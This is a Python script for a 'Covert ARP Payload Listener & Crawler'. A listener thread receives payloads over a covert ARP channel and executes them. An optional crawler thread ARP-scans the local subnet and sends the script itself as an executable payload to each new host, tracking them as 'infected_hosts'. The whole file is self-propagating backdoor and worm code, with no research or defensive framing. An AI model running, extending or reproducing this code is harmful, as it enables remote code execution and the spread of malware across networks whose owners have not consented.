#!/usr/bin/env python3
import logging
import argparse
import os
import sys
import time
import threading

# --- Robust Path Setup ---
def find_project_root(start_path):
    """Searches for the project root (marked by 'main.py') starting from start_path."""
    current_path = os.path.abspath(start_path)
    while True:
        if os.path.exists(os.path.join(current_path, 'main.py')):
            return current_path
        parent_path = os.path.dirname(current_path)
        if parent_path == current_path: # Reached the filesystem root
            return None
        current_path = parent_path

project_root = find_project_root(os.path.dirname(__file__))
if project_root:
    sys.path.append(project_root)
else:
    print("Error: Could not find the project root ('main.py'). Please run from within the project structure.", file=sys.stderr)
    sys.exit(1)

from modules.covert_channel import listen_for_payload, execute_payload, send_arp_payload
from modules.mitm import MITM

LOCK_FILE = "/tmp/covert_crawler.lock"

def get_local_ip_and_subnet():
    """
    A simple (and often unreliable) way to get the local IP and subnet.
    Should be replaced with a more robust method in a real-world scenario.
    """
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
        subnet = ".".join(IP.split('.')[:-1]) + ".0/24"
    except Exception:
        IP = '127.0.0.1'
        subnet = '127.0.0.1/24'
    finally:
        s.close()
    return IP, subnet

def crawler_thread():
    """
    The main logic for the self-propagating crawler.
    """
    if os.path.exists(LOCK_FILE):
        return # Crawler is already running on this host

    with open(LOCK_FILE, "w") as f:
        f.write(str(os.getpid()))

    logging.info("Starting crawler thread...")
    mitm = MITM()
    local_ip, subnet = get_local_ip_and_subnet()
    infected_hosts = {local_ip}

    while True:
        live_hosts = mitm.arp_scan(subnet)
        new_hosts = [h['ip'] for h in live_hosts if h['ip'] not in infected_hosts]

        for host_ip in new_hosts:
            logging.info(f"Attempting to infect new host: {host_ip}")
            with open(__file__, 'rb') as f:
                listener_payload = f.read()

            send_arp_payload(host_ip, listener_payload, payload_type="EXECUTABLE")
            infected_hosts.add(host_ip)
            time.sleep(1)

        time.sleep(60)

def listener_thread(timeout):
    """
    The main logic for the payload listener.
    """
    while True:
        logging.info("Starting listener...")
        payload, payload_type = listen_for_payload(timeout=timeout)

        if payload and payload_type:
            logging.info(f"Payload received. Type: {payload_type}")
            execute_payload(payload, payload_type)
        else:
            logging.warning("Listener timed out or received an incomplete payload.")

def main():
    """
    A standalone listener that receives and executes payloads,
    and can self-propagate to other hosts on the network.
    """
    parser = argparse.ArgumentParser(description="Covert ARP Payload Listener & Crawler")
    parser.add_argument("--timeout", type=int, default=300, help="Timeout in seconds to listen for a payload.")
    parser.add_argument("--crawl", action="store_true", help="Enable the self-propagating crawler functionality.")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    if args.crawl:
        crawler = threading.Thread(target=crawler_thread)
        crawler.daemon = True
        crawler.start()

    listener = threading.Thread(target=listener_thread, args=(args.timeout,))
    listener.daemon = True
    listener.start()

    while True:
        time.sleep(1) # Keep the main thread alive

if __name__ == "__main__":
    main()
